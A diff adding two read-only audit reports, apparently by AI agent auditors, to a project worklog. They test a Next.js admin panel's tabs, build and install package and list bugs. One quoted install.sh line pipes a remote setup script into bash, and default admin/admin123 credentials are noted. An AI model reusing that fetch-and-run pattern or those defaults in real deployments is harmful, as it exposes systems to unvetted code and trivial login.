@@ -12706,3 +12706,1991 @@ Stage Summary:
 - آموزش: https://github.com/ldrcoir/ehsan-site-private/raw/main/public/TUTORIAL_FA_V17.2.docx
 
 ---
+--- Task ID: V17.2-FINAL-AUDIT-2 ---
+Agent: QA Auditor (read-only audit)
+Task: Final functional test of the admin panel — every tab end-to-end, TypeScript, build, and standalone package verification.
+
+================================================================================
+SECTION 1 — TAB-BY-TAB FUNCTIONAL AUDIT
+================================================================================
+Source: src/app/user-dashboard/page.tsx (declares tabs at line 164: ["overview", "messages", "content", "text", "nav", "themes", "users", "clips", "font", "settings"]).
+
+--------------------------------------------------------------------------------
+TAB 1 — overview
+--------------------------------------------------------------------------------
+- Renders: inline component (page.tsx:233-263) — `dashboard-info-grid` cards reading from `user` state set by top-level useEffect.
+- API: GET /api/user/verify (page.tsx:98).
+- Endpoint: src/app/api/user/verify/route.ts:16 — exists.
+- Shape: client reads `data.ok`, `data.user`, `data.access.allowed`, `data.access.reason` (page.tsx:101-107). Server returns exactly these fields (verify/route.ts:33-49). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+
+--------------------------------------------------------------------------------
+TAB 2 — messages (admin only)
+--------------------------------------------------------------------------------
+- Renders: inline MessagesPanel (page.tsx:358-504).
+- APIs:
+  • GET /api/messages (page.tsx:366) → src/app/api/messages/route.ts:9 GET. Exists ✓. Shape: `{ ok, messages[], tags, stats }` (route.ts:34-46). Client reads `data.ok`, `data.messages` (page.tsx:369). ✓ MATCH.
+  • POST /api/admin/reply (page.tsx:382) → src/app/api/admin/reply/route.ts:13 POST. Exists ✓. Body `{ messageId, reply }` (page.tsx:386). Server reads `body.messageId`, `body.reply` (reply/route.ts:25-26). ✓ MATCH.
+  • POST /api/admin/clear (page.tsx:407) → src/app/api/admin/clear/route.ts:11 POST. Exists ✓. Body `{ target: "message", id }` (page.tsx:411). Server case `"message"` (clear/route.ts:40). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+
+--------------------------------------------------------------------------------
+TAB 3 — content (admin only)
+--------------------------------------------------------------------------------
+- Renders: ContentManager.tsx (page.tsx:276).
+- APIs:
+  • GET /api/admin/content (ContentManager.tsx:30) → src/app/api/admin/content/route.ts:14 GET. Exists ✓. Shape: `{ ok, books[], articles[], tutorials[], skills[], aiInstructions[] }` (route.ts:30-44). Client uses `keyMap[activeType]` → `data[arrKey]` (ContentManager.tsx:38-46). ✓ MATCH.
+  • GET /api/admin/equipment (ContentManager.tsx:30, when activeType==="equipment") → src/app/api/admin/equipment/route.ts:10 GET. Exists ✓. Shape: `{ ok, items[] }` (route.ts:20-26). Client uses `data.items` (ContentManager.tsx:36). ✓ MATCH.
+  • POST /api/admin/content with `{ type, action: "create"|"update"|"delete"|"toggle"|"bulk_import", id?, data? }` (ContentManager.tsx:62-101, 104-120). Server supports all 5 actions (content/route.ts:77-138). ✓ MATCH.
+  • POST /api/admin/equipment with `{ type: "equipment", action: "create"|"update"|"delete"|"toggle", id?, data? }` (ContentManager.tsx:65). Server supports only 4 actions — NO `bulk_import` (equipment/route.ts:49-88, default → 400 "invalid_action").
+- ❌ BUG (CRITICAL for equipment bulk import): ContentManager.tsx:108-113 sends `action: "bulk_import"` to /api/admin/equipment when activeType==="equipment". Equipment route has no such case → falls through to default → returns 400 `{ ok: false, error: "invalid_action" }`. ContentManager.tsx:114-118 only checks `if (data.ok)` so the failure is SILENT — no error shown to user, no items imported, no alert. Bulk import button appears to "do nothing" for equipment.
+- All other CRUD paths (create/update/delete/toggle for both content & equipment) verified working. ✓ WILL WORK except bulk_import for equipment.
+
+--------------------------------------------------------------------------------
+TAB 4 — text (admin only)
+--------------------------------------------------------------------------------
+- Renders: TextEditor.tsx (page.tsx:287).
+- APIs:
+  • GET /api/admin/text (TextEditor.tsx:17) → src/app/api/admin/text/route.ts:13 GET. Exists ✓. Shape: `{ ok, texts: {key: {en,fa,de}} }` for admin (route.ts:29-34). Client reads `data.texts` (TextEditor.tsx:19). ✓ MATCH.
+  • POST /api/admin/text with `{ action: "set", key, valueEn, valueFa, valueDe }` (TextEditor.tsx:32-42). Server case `"set"` (text/route.ts:54-72). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+
+--------------------------------------------------------------------------------
+TAB 5 — nav (admin only)
+--------------------------------------------------------------------------------
+- Renders: NavMenuManager.tsx (page.tsx:298).
+- APIs:
+  • GET /api/admin/nav (NavMenuManager.tsx:16) → src/app/api/admin/nav/route.ts:6 GET. Exists ✓. Shape: `{ ok, items[] }` (route.ts:11-15). Client reads `data.items` (NavMenuManager.tsx:18). ✓ MATCH.
+  • POST /api/admin/nav with `{ action: "create"|"update"|"delete"|"toggle", id?, data? }` (NavMenuManager.tsx:33, 48, 58, 75, 76). Server supports all 4 actions (nav/route.ts:31-65). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+
+--------------------------------------------------------------------------------
+TAB 6 — themes (admin only)
+--------------------------------------------------------------------------------
+- Renders: ThemeBuilder.tsx (page.tsx:309).
+- APIs:
+  • GET /api/admin/themes (ThemeBuilder.tsx:66) → src/app/api/admin/themes/route.ts:10 GET. Exists ✓. Shape: `{ ok, themes[] }` (route.ts:16-21). Client reads `data.themes` (ThemeBuilder.tsx:68). ✓ MATCH.
+  • POST /api/admin/themes with `{ action: "create"|"update"|"delete"|"toggle", id?, data? }` (ThemeBuilder.tsx:80-99, 101-109, 111-118). Server supports all 4 actions (themes/route.ts:45-104). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+
+--------------------------------------------------------------------------------
+TAB 7 — users (admin only)
+--------------------------------------------------------------------------------
+- Renders: AccessUserManager.tsx (page.tsx:320).
+- APIs:
+  • GET /api/admin/users (AccessUserManager.tsx:87) → src/app/api/admin/users/route.ts:33 GET. Exists ✓. Shape: `{ ok, users[] }` (route.ts:38-60). Client reads `data.users` (AccessUserManager.tsx:90). ✓ MATCH.
+  • POST /api/admin/users (AccessUserManager.tsx:167-175) → src/app/api/admin/users/route.ts:65 POST. Exists ✓. Body matches expected schema (route.ts:71-81 vs client line 153-164). ✓ MATCH.
+  • PUT /api/admin/users/[id] (AccessUserManager.tsx:167-175) → src/app/api/admin/users/[id]/route.ts:27 PUT. Exists ✓. Body matches (route.ts:46-69 vs client line 153-164). ✓ MATCH.
+  • DELETE /api/admin/users/[id] (AccessUserManager.tsx:202) → src/app/api/admin/users/[id]/route.ts:100 DELETE. Exists ✓. ✓ MATCH.
+  • GET /api/admin/users/logs?limit=200 (AccessUserManager.tsx:104) → src/app/api/admin/users/logs/route.ts:21 GET. Exists ✓. Shape: `{ ok, logs[], total }` (route.ts:33-47). Client reads `data.logs` (AccessUserManager.tsx:107). ✓ MATCH.
+- Permissions: stored as comma-separated string in `permissions` field of AccessUser. Client sends `permissions: form.permissions.join(",")` (line 161). Server stores `permissions: body.permissions || null` (route.ts:79). On fetch, client splits on "," (line 125). Permission IDs match Tab ids: messages, clips, content, text, nav, themes (AccessUserManager.tsx:37-44). `users` and `font` tabs are admin-only (page.tsx:313 `isAdmin &&`). ✓ WORKS.
+- ❌ ISSUE (LOW): AccessUserManager.tsx fetch calls at lines 87, 104, 167-175, 202 do NOT pass `credentials: "include"`. Modern browsers default to `credentials: "same-origin"` so cookies ARE sent for same-origin (dashboard ↔ API). All other admin components use `credentials: "include"`. Inconsistent but functionally works in current single-origin deployment. Would BREAK if dashboard is ever moved to a different origin (e.g., separate subdomain) without fixing.
+
+--------------------------------------------------------------------------------
+TAB 8 — clips (admin only)
+--------------------------------------------------------------------------------
+- Renders: AparatClipManager.tsx (page.tsx:331).
+- APIs:
+  • GET /api/admin/clips (AparatClipManager.tsx:43) → src/app/api/admin/clips/route.ts:9 GET. Exists ✓. Shape: `{ ok, clips[] }` (route.ts:16-20). Client reads `data.clips` (AparatClipManager.tsx:46). ✓ MATCH.
+  • POST /api/admin/clips with `{ action: "create"|"update", id?, title, embedCode, description, category, visible, order }` (AparatClipManager.tsx:61-65, 68-73). Server supports both actions (clips/route.ts:38-65). ✓ MATCH.
+  • DELETE /api/admin/clips with `{ id }` (AparatClipManager.tsx:91-96). Server supports (clips/route.ts:75-92). ✓ MATCH.
+- Errors: none expected. ✓ WILL WORK.
+- Auth note: /api/admin/clips uses `checkAdminSession` (clips/route.ts:6, 11, 30, 77) — session cookie only, no password fallback. Works for dashboard (session-based).
+
+--------------------------------------------------------------------------------
+TAB 9 — font (admin only)
+--------------------------------------------------------------------------------
+- Renders: FontSelector.tsx (page.tsx:342).
+- API: NONE. Reads/writes localStorage key `site_font` (FontSelector.tsx:24, 30). Sets `data-font` attribute on <html> (line 31).
+- Errors: none. ✓ WILL WORK (client-only, no network round-trip).
+
+--------------------------------------------------------------------------------
+TAB 10 — settings (admin AND regular user)
+--------------------------------------------------------------------------------
+- Renders: SettingsPanel.tsx (page.tsx:347).
+- APIs (loadSettings, line 299-346):
+  • GET /api/admin/settings → src/app/api/admin/settings/route.ts:99 GET. Exists ✓. Shape: `{ ok, settings: {apiEnabled, baleEnabled, baleBotToken, baleChatId, telegramEnabled, telegramBotToken, telegramChatId, adminDisplayName, adminTagline, adminStatus, visitorCount} }` (route.ts:109-129). Client reads matching keys (SettingsPanel.tsx:313-325). ✓ MATCH.
+  • GET /api/admin/email → src/app/api/admin/email/route.ts:20 GET. Exists ✓. Shape: `{ ok, email: "..." }` (route.ts:27-28). Client reads `emailData.email` (SettingsPanel.tsx:328). ✓ MATCH.
+  • GET /api/content → src/app/api/content/route.ts:9 GET. Exists ✓. Shape: `{ ok, ..., settings: {key: value, ...} }` (route.ts:52). Client reads `cs.name_fa`, `cs.name_en`, `cs.name_de`, `cs.handle`, `cs.tagline_fa`, `cs.tagline_en`, `cs.tagline_de` (SettingsPanel.tsx:333-339). These keys ARE present in /api/content's flat settings object IF they have been saved by /api/admin/security actions `change_name` / `change_handle` / `change_tagline` (which upsert to siteSetting with keys `name_fa`, `name_en`, `name_de`, `handle`, `tagline_fa`, `tagline_en`, `tagline_de`). Fresh install: keys may not exist yet, but `|| ""` fallback handles undefined. ✓ MATCH.
+- APIs (loadProviders, line 348-354):
+  • GET /api/admin/providers → src/app/api/admin/providers/route.ts:10 GET. Exists ✓. Shape: `{ ok, providers[] }` with apiKey masked as `••••••••`+last4 (route.ts:22-32). Client reads `data.providers` (SettingsPanel.tsx:352). ✓ MATCH.
+- Save functions:
+  • changePassword (SettingsPanel.tsx:377-408) → POST /api/admin/security with `{ action: "change_password", currentPassword, newPassword }`. Server (security/route.ts:56-100) validates `currentPassword`, checks admin user, verifies with `verifyPassword`, updates hash. ✓ WORKS.
+  • changeHandle (line 411-423) → POST /api/admin/security `{ action: "change_handle", newHandle }`. Server (security/route.ts:102-115) upserts siteSetting key="handle". ✓ WORKS.
+  • changeName (line 426-438) → POST /api/admin/security `{ action: "change_name", newName, lang }`. Server (security/route.ts:117-134) upserts siteSetting key=`name_${lang}`. ✓ WORKS.
+  • changeTagline (line 441-452) → POST /api/admin/security `{ action: "change_tagline", newTagline, lang }`. Server (security/route.ts:136-148) upserts siteSetting key=`tagline_${lang}`. ✓ WORKS.
+  • saveEmail (line 455-467) → POST /api/admin/email `{ action: "set_email", email }`. Server (email/route.ts:47-58) upserts siteSetting key="forwardEmail". ✓ WORKS.
+  • saveBale (line 470-484) → POST /api/admin/settings `{ settings: {baleBotToken, baleChatId, baleEnabled} }`. Server (settings/route.ts:54-83) iterates allowedKeys. ✓ WORKS.
+  • saveTelegram (line 487-500) → POST /api/admin/settings `{ settings: {telegramBotToken, telegramChatId, telegramEnabled} }`. Server same as above. ✓ WORKS.
+  • saveAi (line 503-516) → POST /api/admin/settings `{ settings: {apiEnabled, adminTagline, adminStatus} }`. Server same. ✓ WORKS.
+  • saveProvider (line 519-541) → POST /api/admin/providers `{ action: "create"|"update", id?, data: {...} }`. Server (providers/route.ts:43-129) supports both. ✓ WORKS.
+  • deleteProvider (line 544-553) → POST /api/admin/providers `{ action: "delete", id }`. Server supports. ✓ WORKS.
+  • toggleProvider (line 556-559) → POST /api/admin/providers `{ action: "toggle", id }`. Server supports. ✓ WORKS.
+- Sections present (verified in render at SettingsPanel.tsx:573-963):
+  • Appearance (panel language + site font) — line 574-602 ✓
+  • Name (3 lang inputs + handle) — line 604-656 ✓
+  • Tagline (3 lang inputs) — line 658-701 ✓
+  • Password (currentPassword + newPassword + show/hide toggle) — line 703-737 ✓
+  • Email (forward email) — line 739-753 ✓
+  • Bale Bot (token + chatId) — line 755-778 ✓
+  • Telegram Bot (token + chatId) — line 780-803 ✓
+  • AI Providers (apiEnabled checkbox + provider list + add/edit/delete/toggle) — line 805-950 ✓
+  • Help (6 hints) — line 952-963 ✓
+- All required sections present. ✓ ALL SAVE FUNCTIONS WORK.
+
+================================================================================
+SECTION 2 — COMPONENT AUDIT
+================================================================================
+
+--------------------------------------------------------------------------------
+2.1 SettingsPanel.tsx — 967 lines
+--------------------------------------------------------------------------------
+- All 9 sections present (verified above).
+- All 11 save functions trace correctly to matching API endpoints.
+- loadSettings (line 299-346) uses Promise.all to load 3 endpoints in parallel. Each result is checked with `if (data.ok)`. Failures are silently swallowed in catch {} (line 341-343).
+- apiKey masking: when editing a provider, the masked apiKey "••••••••xxxx" is preserved (client doesn't overwrite with the masked value, see saveProvider line 528: `p.apiKey && !p.apiKey.startsWith("••••") ? p.apiKey : undefined`). Server side check (providers/route.ts:87). ✓ CORRECT.
+
+--------------------------------------------------------------------------------
+2.2 ContentManager.tsx — 265 lines
+--------------------------------------------------------------------------------
+- loadItems (line 26-55): for equipment → GET /api/admin/equipment, reads `data.items`. For others → GET /api/admin/content, reads `data[arrKey]` where arrKey = "books"|"articles"|"tutorials"|"skills"|"aiInstructions". Server returns matching keys (content/route.ts:30-43). ✓ WORKS for all 6 types.
+- saveItem (line 62-81): sends `{ type, action: "create"|"update", id?, data }`. Strips id/createdAt/updatedAt. Stringifies specs object if equipment. Server handles (content/route.ts:78-98, equipment/route.ts:50-68). ✓ WORKS.
+- deleteItem (line 83-92): sends `{ type, action: "delete", id }`. ✓ WORKS.
+- toggleItem (line 94-102): sends `{ type, action: "toggle", id }`. For content, server uses `enabled` for aiInstruction, `visible` for others (content/route.ts:112). For equipment, server toggles `visible` (equipment/route.ts:75-85). ✓ WORKS.
+- ❌ bulkImport (line 104-120): see BUG above. For non-equipment types, sends to /api/admin/content with `action: "bulk_import"`. Server handles (content/route.ts:117-135). ✓ WORKS for books/articles/tutorials/skills/aiInstructions. ✗ BROKEN for equipment.
+
+--------------------------------------------------------------------------------
+2.3 AccessUserManager.tsx — 577 lines
+--------------------------------------------------------------------------------
+- fetchUsers (line 84-99): GET /api/admin/users. Reads `data.users`. ✓ WORKS.
+- handleSubmit (line 149-197): POST /api/admin/users (create) OR PUT /api/admin/users/[id] (edit). Body matches server schema. Error mapping covers all known server errors. ✓ WORKS.
+- handleDelete (line 199-217): DELETE /api/admin/users/[id]. ✓ WORKS.
+- fetchLogs (line 101-113): GET /api/admin/users/logs?limit=200. ✓ WORKS.
+- startEdit (line 115-130): correctly populates form from existing user. Permissions string split on ",". allowedDays split on ",". expiresAt converted from ISO to YYYY-MM-DD for <input type="date">. ✓ WORKS.
+- Permissions: PERMISSION_SECTIONS (line 37-44) match tab IDs. Stored as CSV in `permissions` field. Server (users/route.ts:79, 56) accepts and stores as-is. ✓ CORRECT.
+
+--------------------------------------------------------------------------------
+2.4 AparatClipManager.tsx — 295 lines
+--------------------------------------------------------------------------------
+- fetchClips (line 39-55): GET /api/admin/clips. ✓ WORKS.
+- handleSubmit (line 57-86): POST /api/admin/clips with `action: "create"|"update"`, spreads form fields. Server reads `body.action`, `body.id`, `body.title`, `body.embedCode`, etc. ✓ WORKS.
+- handleDelete (line 88-101): DELETE /api/admin/clips with `{ id }`. ✓ WORKS.
+- startEdit/startNew (line 103-120): correctly populates form. ✓ WORKS.
+
+================================================================================
+SECTION 3 — TYPESCRIPT & BUILD
+================================================================================
+
+--------------------------------------------------------------------------------
+3.1 TypeScript check
+--------------------------------------------------------------------------------
+Command: `cd /home/z/my-project && npx tsc --noEmit`
+Exit code: 0
+Output: (empty — no errors)
+✅ CLEAN. Zero TypeScript errors.
+
+--------------------------------------------------------------------------------
+3.2 Next.js production build
+--------------------------------------------------------------------------------
+Command: `cd /home/z/my-project && rm -rf .next && npx next build`
+Exit code: 0
+Output (tail):
+  All 32 API routes compiled successfully (ƒ proxy/middleware + ƒ dynamic routes + ○ static).
+  Routes verified in build output:
+    /api/admin/clips ✓    /api/admin/security ✓    /api/admin/users/[id] ✓
+    /api/admin/content ✓  /api/admin/settings ✓    /api/admin/users/logs ✓
+    /api/admin/email ✓    /api/admin/stats ✓      /api/messages ✓
+    /api/admin/equipment ✓ /api/admin/text ✓       /api/user/login ✓
+    /api/admin/nav ✓     /api/admin/themes ✓      /api/user/logout ✓
+    /api/admin/providers ✓ /api/admin/users ✓       /api/user/verify ✓
+    /api/admin/reply ✓   /api/admin/clear ✓        /api/admin/chat-reply ✓
+✅ BUILD SUCCEEDS. All endpoints compiled.
+
+================================================================================
+SECTION 4 — STANDALONE PACKAGE VERIFICATION
+================================================================================
+
+--------------------------------------------------------------------------------
+4.1 Local .next/standalone (fresh build)
+--------------------------------------------------------------------------------
+After `next build`, the standalone output is at .next/standalone/.
+Contents:
+  - server.js ✓
+  - .env (DATABASE_URL=file:/home/z/my-project/db/custom.db) ✓
+  - package.json ✓
+  - prisma/schema.prisma ✓
+  - .next/BUILD_ID ✓
+  - .next/server/ (compiled server-side bundles) ✓
+  - .next/static/ (CSS/JS chunks) ✗ MISSING — must be copied manually
+  - public/ ✗ MISSING — must be copied manually
+  - db/custom.db (428KB dev DB — traced in despite outputFileTracingIncludes exclusion) ⚠
+  - node_modules/ (138MB — includes @prisma 58MB multi-DB WASM + @img 37MB sharp binaries)
+
+Size breakdown (local .next/standalone):
+  Total:        138 MB
+  @prisma:       58 MB (includes query_compiler_bg.{cockroachdb,mysql,mongodb,postgresql,sqlserver}.wasm-base64.js — only sqlite is used; 50MB+ wasted)
+  @img:          37 MB (sharp native binaries — Next.js Image component disabled in this app; unused)
+  @next:         28 KB
+  @swc:          60 KB
+  .next/server: 4.3 MB
+  db/custom.db: 428 KB
+
+NOTE: Worklog V17.2 claim "حذف sharp (37MB)" is FALSE for local .next/standalone — @img is still traced in. Claim "standalone package: 18MB (از 138MB)" is true ONLY for the shipped install-v17.2.zip (which is differently packaged).
+
+--------------------------------------------------------------------------------
+4.2 Local standalone smoke test (after manual copy of .next/static + public)
+--------------------------------------------------------------------------------
+Command: `cd .next/standalone && cp -r ../static .next/ && cp -r ../../../public . && PORT=3939 node server.js`
+Result:
+  ✓ Server boots: "▲ Next.js 16.3.6 — Ready in 0ms"
+  GET / → HTTP 200 (200ms) ✓
+  GET /user-login → HTTP 200 ✓
+  GET /user-dashboard (no cookie) → HTTP 307 (redirect to /user-login) ✓
+  GET /api/content → HTTP 200 ✓ (public endpoint)
+  GET /api/messages (no cookie) → HTTP 401 ✓ (auth enforced)
+  GET /api/admin/users (no cookie) → HTTP 401 ✓ (auth enforced)
+  GET /api/admin/clips (no cookie) → HTTP 401 ✓ (auth enforced)
+✅ LOCAL STANDALONE IS RUNNABLE when .next/static + public are copied in.
+
+--------------------------------------------------------------------------------
+4.3 Shipped install-v17.2.zip — CRITICAL BUG
+--------------------------------------------------------------------------------
+File: /home/z/my-project/public/install-v17.2.zip (18MB compressed / 54MB uncompressed)
+
+Extracted contents (/tmp/install-check/personal-site):
+  ✓ server.js (root)
+  ✓ package.json
+  ✓ node_modules/ (@next, @prisma/client, react, react-dom, semver, styled-jsx, detect-libc, client-only, @swc/helpers)
+  ✓ .next/static/ (CSS, JS chunks, _buildManifest.js, _ssgManifest.js)
+  ✓ prisma/schema.prisma
+  ✓ public/ (icon-192.png, icon-512.png, logo.svg, manifest.json, robots.txt)
+  ✓ scripts/, install.sh, README.md, VERSION.txt, .env.example, Caddyfile, nginx-ehsanmorad.conf
+  ✗✗✗ MISSING:
+       .next/server/             (compiled server-side bundles — required at runtime)
+       .next/BUILD_ID            (required by Next.js startup)
+       .next/required-server-files.json
+       .next/routes-manifest.json
+       .next/prerender-manifest.json
+       .next/app-path-routes-manifest.json
+       .next/build-manifest.json
+
+Smoke test of shipped zip:
+  Command: `cd /tmp/install-check/personal-site && PORT=3940 node server.js`
+  Result:
+    ▲ Next.js 16.3.6 — Ready in 0ms
+    ✗ Error: Could not find a production build in the './.next' directory. Try building your app with 'next build' before starting the production server.
+    GET / → HTTP 000 (connection refused — server crashed)
+    All other endpoints → HTTP 000
+
+❌ CRITICAL: install-v17.2.zip is BROKEN. The packaging script (not found in repo — likely manual) copied only .next/static/ but NOT .next/server/, BUILD_ID, or any server-side manifest. install.sh's systemd service runs `node server.js` directly in this directory → server crashes immediately on startup.
+
+ANY USER WHO DOWNLOADS INSTALL-V17.2.ZIP AND RUNS install.sh WILL GET A CRASHING SERVICE.
+
+install.sh detects `server.js` in current dir → uses "standalone mode" (install.sh:149-152) → does NOT run `next build` → server.js tries to read .next/BUILD_ID → file not found → fatal error.
+
+--------------------------------------------------------------------------------
+4.4 Shipped source-v17.2.zip
+--------------------------------------------------------------------------------
+File: /home/z/my-project/public/source-v17.2.zip (308KB)
+Contents: raw source only (src/, prisma/, scripts/, public/, package.json, install.sh, etc.). No node_modules, no .next. Requires `npm install && next build` to use. Layout correct for source distribution.
+
+================================================================================
+SECTION 5 — REMAINING ISSUES THAT PREVENT PANEL FROM WORKING
+================================================================================
+
+P0 — BLOCKER (must fix before V17.2 ships):
+1. install-v17.2.zip is missing .next/server/, .next/BUILD_ID, .next/*-manifest.json. Server crashes on startup with "Could not find a production build in the './.next' directory". No user can install V17.2 from the shipped zip. Fix: repackage install-v17.2.zip by copying the FULL .next/standalone/.next/ directory (including server/, BUILD_ID, *.json manifests), not just .next/static/. Or change the layout to ship the standalone directory itself (server.js + .next/server + .next/static + node_modules) instead of trying to use a root server.js + .next/static only.
+   Files: /home/z/my-project/public/install-v17.2.zip (binary)
+   Related: /home/z/my-project/install.sh:149-162 (server.js detection logic assumes standalone files pre-copied)
+
+P1 — FUNCTIONAL BUG:
+2. ContentManager bulkImport for equipment silently fails. /api/admin/equipment/route.ts:49-88 doesn't implement `bulk_import` action — falls through to default → 400 invalid_action. ContentManager.tsx:114-118 doesn't surface the error.
+   Files: /home/z/my-project/src/components/ContentManager.tsx:104-120 (client) + /home/z/my-project/src/app/api/admin/equipment/route.ts:49-88 (server)
+   Fix: either implement bulk_import on equipment endpoint, OR route the equipment bulk_import to /api/admin/content with type=equipment (but content endpoint doesn't know about equipment model either), OR disable the "bulk import" button in ContentManager when activeType==="equipment".
+
+P2 — INCONSISTENCY:
+3. AccessUserManager.tsx fetch calls at lines 87, 104, 167-175, 202 don't pass `credentials: "include"`. Works in same-origin (browser default = "same-origin") but breaks if dashboard is moved to a different origin. All other admin components use `credentials: "include"`.
+   Files: /home/z/my-project/src/components/AccessUserManager.tsx:87, 104, 167-175, 202
+
+P3 — SIZE / OPTIMIZATION (not a functional blocker):
+4. .next/standalone includes 58MB of unused Prisma multi-DB WASM compilers (cockroachdb, mysql, mongodb, postgresql, sqlserver). Only sqlite is used by schema.prisma. Fix: configure Prisma client generator to only emit sqlite engine, OR strip the unused WASM files from the standalone output post-build.
+5. .next/standalone includes 37MB of @img/sharp-* native binaries. Next.js Image component is not used in this codebase (images served directly via <img>/CSS). Fix: either explicitly remove @img from node_modules post-build, or use `images.unoptimized: true` and remove sharp from deps.
+6. .next/standalone includes 428KB db/custom.db (dev database) traced in by Next.js file tracing (despite being removed from outputFileTracingIncludes — Next.js traces imports). install-v17.2.zip's db/ folder is correctly empty (the install zip was packaged without it), so this only affects the local standalone output, not the shipped artifact.
+7. Standalone size discrepancy vs worklog claim: worklog says "standalone package: 18MB (از 138MB)". The shipped install-v17.2.zip is 18MB compressed / 54MB uncompressed. The local .next/standalone is 138MB. The "18MB" in worklog refers to the compressed zip — this is correct but confusing.
+
+================================================================================
+SECTION 6 — SUMMARY TABLE
+================================================================================
+| Tab       | Component              | API endpoint(s)                                  | Endpoint exists? | Shape match? | Will work? |
+|-----------|------------------------|--------------------------------------------------|------------------|--------------|------------|
+| overview  | inline (page.tsx:233)  | GET /api/user/verify                             | ✓                | ✓            | ✓          |
+| messages  | MessagesPanel          | GET /api/messages, POST /api/admin/reply, /clear  | ✓                | ✓            | ✓          |
+| content   | ContentManager         | GET/POST /api/admin/content, /api/admin/equipment | ✓                | ✓ (except bulk_import equipment) | ✗ bulk_import equipment |
+| text      | TextEditor             | GET/POST /api/admin/text                          | ✓                | ✓            | ✓          |
+| nav       | NavMenuManager         | GET/POST /api/admin/nav                           | ✓                | ✓            | ✓          |
+| themes    | ThemeBuilder           | GET/POST /api/admin/themes                        | ✓                | ✓            | ✓          |
+| users     | AccessUserManager      | GET /api/admin/users, POST, PUT/DELETE [id], GET logs | ✓          | ✓            | ✓ (missing credentials but works same-origin) |
+| clips     | AparatClipManager      | GET/POST/DELETE /api/admin/clips                   | ✓                | ✓            | ✓          |
+| font      | FontSelector           | (none — localStorage only)                       | n/a              | n/a          | ✓          |
+| settings  | SettingsPanel          | /api/admin/{settings,email,security,providers}, /api/content | ✓ all     | ✓ all        | ✓          |
+
+================================================================================
+SECTION 7 — VERDICT
+================================================================================
+- TypeScript:        ✅ 0 errors
+- Next.js build:     ✅ succeeds, all 32 API routes compiled
+- Local standalone:  ✅ runs successfully after copying .next/static + public
+- Shipped zip:       ❌ install-v17.2.zip is BROKEN — missing .next/server/, BUILD_ID, manifest files → server crashes on startup
+- All 10 tabs:       ✅ 9/10 tabs fully functional in local standalone; 1/10 (content) has a partial bug (equipment bulk_import silently fails — does NOT crash other operations)
+
+CRITICAL FINDING: V17.2 is NOT installable from the shipped install-v17.2.zip. The packaging script (not found in repo — appears to be manual) copied .next/static/ but missed .next/server/, BUILD_ID, and all manifest JSON files. install.sh assumes "standalone mode" when server.js is present and does NOT re-build — so any user following the install instructions will get a non-running service.
+
+Functionality of the admin panel itself (when running locally from .next/standalone) is GOOD — all 10 tabs render, all save/load functions work, all API endpoints exist with matching request/response shapes. The single functional bug (equipment bulk_import) is a minor edge case that doesn't affect normal CRUD operations.
+
+================================================================================
+NO CODE CHANGES MADE (read-only audit per task instructions)
+================================================================================
+--- end V17.2-FINAL-AUDIT-2 ---
+
+================================================================================
+--- Task ID: V17.2-FINAL-AUDIT-3 ---
+Agent: DevOps Auditor (read-only)
+Task: Final install.sh audit + standalone package verification
+Date: 2026-09-26
+================================================================================
+
+SCOPE
+  - Static audit of /home/z/my-project/install.sh (301 lines, 11153 bytes)
+  - Static audit of standalone package at
+    https://github.com/ldrcoir/ehsan-site/raw/main/public/install-v17.2.zip
+    (md5 350d1ebd040ea39429b875be5b71927a, 18,605,747 bytes, 1404 files)
+  - Verified identical package at -private repo URL (same md5)
+  - Bash syntax validated via `bash -n` — PASS (no syntax errors)
+  - NO code changes made (read-only audit)
+
+================================================================================
+EXECUTIVE SUMMARY — INSTALL WILL FAIL ON A FRESH VPS
+================================================================================
+VERDICT: ❌ BLOCKER — install.sh cannot bootstrap a working site on a clean VPS.
+
+Root cause chain (any one of these alone is fatal):
+  C1. install.sh never runs `prisma db push` → SQLite DB stays empty (0 tables)
+  C2. `scripts/seed_access_users.py` hardcodes `/home/z/my-project/node_modules/bcryptjs`
+      (the dev-machine path) — VPS does not have this path
+  C3. `bcryptjs` is NOT shipped in the standalone package's node_modules/
+      (verified — only 10 top-level packages: @next, @prisma, @swc, client-only,
+      detect-libc, next, react, react-dom, semver, styled-jsx)
+  C4. `python3 scripts/seed_*.py 2>&1 | tail -1 || true` silently swallows all
+      errors → install.sh prints "✅ دیتابیس seed شد" even when every seed failed
+
+End-user experience after `sudo ./install.sh`:
+  1. Script reports success: "✅ نصب کامل شد!"
+  2. Next.js starts but every DB query throws "no such table: AccessUser" etc.
+  3. curl http://localhost:3000/ likely returns 500 → SUCCESS=false printed
+  4. User visits /user-login, tries admin/admin123 → "invalid_credentials"
+     (no admin user was created)
+  5. No recovery path documented — user is told the credentials ARE admin/admin123
+
+Reproducible proof (run inside extracted package at /tmp/pkg-audit/personal-site):
+  $ mkdir -p db && touch db/custom.db
+  $ python3 scripts/seed_access_users.py
+  → ERROR: AccessUser table does not exist. Run: bunx prisma db push
+  (verified on dev box at /home/z/my-project — same script passes only because
+   dev DB already has tables from prior `prisma db push`)
+
+================================================================================
+QUESTION-BY-QUESTION ANSWERS
+================================================================================
+
+Q1. Does the script handle all edge cases?
+    ❌ NO. Major gaps:
+       - Empty DB (no tables) → no `prisma db push` (C1)
+       - Missing bcryptjs in package (C3)
+       - Hardcoded dev-machine paths in 4 scripts (M5)
+       - Empty $DOMAIN_FOUND prints malformed webhook URL `https:///api/...` (H1)
+       - Hardcoded IP `31.70.76.10` fallback wrong on any non-original VPS (H2)
+       - `set -e` aborts at `nginx -t` failure with no recovery (H4)
+       - No `set -o pipefail` — `python3 ... | tail -1` always returns 0
+       - `host` command may not exist on minimal VPS (not installed) (M3)
+       - `ufw` may not be installed (line 73 may install it; line 85 calls it before
+         ufw is confirmed installed if nginx branch was taken first)
+       - No disk-space check; no swap-exists-but-disabled check (swapon --show
+         grep may return true even when swap is disabled)
+
+Q2. Will it work if Node.js is missing? (curl install)
+    ⚠ MOSTLY. Logic at L46-59 is correct:
+       - If `node` missing → `curl -fsSL https://deb.nodesource.com/setup_22.x | bash -`
+         then `apt install -y nodejs`
+       - If `node` present but <v20 → same path
+       Issues:
+       - No `apt update` before `apt install -y nodejs` (NodeSource setup script
+         usually runs apt update internally, but not guaranteed)
